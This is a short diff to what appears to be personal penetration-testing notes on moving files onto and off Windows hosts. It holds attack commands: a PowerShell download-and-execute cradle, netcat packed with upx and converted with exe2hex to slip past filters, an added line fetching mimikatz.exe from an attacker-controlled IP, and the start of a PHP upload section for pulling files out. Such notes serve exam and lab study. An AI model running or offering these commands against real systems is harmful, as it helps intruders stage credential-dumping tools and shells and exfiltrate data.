@@ -19,6 +19,9 @@ PS:IEX (New-Object System.Net.WebClient).DownloadString('path/d_f.ps1') -- Cant 
 upx -9 nc.exe(compress to be smaller)
 exe2hex -x nc.exe -p nc.cmd(convert the file to hex and instruct powershell.exe to assemble it back into binary)
 ```
+```
+iwr -uri http://192.168.45.214:8000/mimikatz.exe -Outfile mimikatz.exe
+```
 #### Upload Files using enabled outbound http traffic
 ```
 save upload.php under kali /var/www/html
